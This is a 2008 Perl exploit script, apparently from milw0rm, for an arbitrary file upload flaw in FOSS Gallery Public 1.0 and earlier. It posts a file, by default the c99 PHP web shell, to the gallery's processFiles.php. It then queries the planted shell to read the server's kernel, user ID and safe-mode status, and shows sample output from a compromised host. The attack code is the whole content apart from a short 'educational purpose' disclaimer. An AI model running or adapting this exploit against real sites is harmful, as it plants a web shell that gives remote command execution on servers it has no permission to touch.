<html><head><title>FOSS Gallery Public <= 1.0 Arbitrary Upload / Information c99 Expoit</title></head><pre># FOSS Gallery Public &lt;= 1.0 Arbitrary Upload / Information c99 Expoit
# url: http://downloads.sourceforge.net/fossgallery/
#
# Author: JosS
# mail: sys-project[at]hotmail[dot]com
# site: http://spanish-hackers.com
# team: Spanish Hackers Team - [SHT]
#
# This was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.
#
# OUTPUT:
#
# Exploited sucessfully.
#
# [+] Info:
#    Linux h4x0rz 2.6.18-6-686 #1 SMP Mon Aug 18 08:42:39 UTC 2008 i686
#    uid=33(www-data) gid=33(www-data) groups=33(www-data)
#    Safe Mode: OFF (not secure)
#
# joss@h4x0rz:~/Desktop$


use LWP::UserAgent;
use HTTP::Request::Common;
use HTTP::Headers;
use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;

sub lw
{

my $SO = $^O;
my $linux = &quot;&quot;;
if (index(lc($SO),&quot;win&quot;)!=-1){
		   $linux=&quot;0&quot;;
	    }else{
		    $linux=&quot;1&quot;;
	    }
		if($linux){
system(&quot;clear&quot;);
}
else{
system(&quot;cls&quot;);
}
}

my ($host, $file) = @ARGV ;

if (!$ARGV[0]) {

&amp;lw;
print &quot;\n[x] FOSS Gallery Public &lt;= 1.0 Arbitrary Upload / Information c99 Expoit\n&quot;;
print &quot;[x] written by JosS - sys-project[at]hotmail.com\n&quot;;
print &quot;[x] http://www.spanish-hackers.com/\n\n&quot;;
print &quot;Usage: $0 [host] [file] \n&quot;;
print &quot;if doesn't exist the file: file default is phpshell C99\n\n&quot;;
exit;
}
if (!$ARGV[1])
{
$file=&quot;c99.php&quot;;
}

&amp;lw;

$host = 'http://'.$host if ($host !~ /^http:/);
$host .= &quot;/&quot; if ($host !~ /\/\$/);

my $ua = LWP::UserAgent-&gt;new();
$ua-&gt;timeout(12);
my $request = HTTP::Request-&gt;new();
my $response;
my $header;
my $url = $host.&quot;processFiles.php&quot;;

$response = $ua-&gt;request(POST $url, Content_Type =&gt; 'form-data',
					Content =&gt; [ uploadNeed =&gt; &quot;1&quot;, uploadFile0 =&gt; [$file]]);
$content = $response-&gt;content;

if ($content =~ /uploaded sucessful/) { print &quot;\nExploited sucessfully.\n&quot;; }
else { print &quot;\nExploit failed\n&quot;; exit;}

my $c99=&quot;c99.php&quot;; 
chomp ($c99);

if ($file =~ /c99.php/)
{

$comando=&quot;?act=cmd&amp;d=/&amp;cmd=/&amp;cmd_txt=1&amp;submit=Execute&quot;;

print &quot;\n&quot;;


my $final = $host.$c99.$comando;

my $ua = LWP::UserAgent-&gt;new;

my $req = HTTP::Request-&gt;new(GET =&gt; $final);

$ua-&gt;timeout(10);

$doc = $ua-&gt;request($req)-&gt;as_string;



$kernel = $1 if ( $doc =~ m/-a:&amp;nbsp; (.*?)\&lt;\/b&gt;/mosix);
$id = $1 if ( $doc =~ m/&lt;b&gt;uid (.*?)\&lt;\/b&gt;/mosix);

$safe = $1 if ( $doc =~ m/color=green&gt; (.*?)\&lt;\/font&gt;/mosix);



print &quot;[+] Info:\n&quot;;

print &quot;    $kernel\n&quot;;
print &quot;    uid$id\n&quot;;

print &quot;    Safe Mode: $safe\n&quot;;

print &quot;\n&quot;;



}

__EOF__

# milw0rm.com [2008-10-05]</pre></html>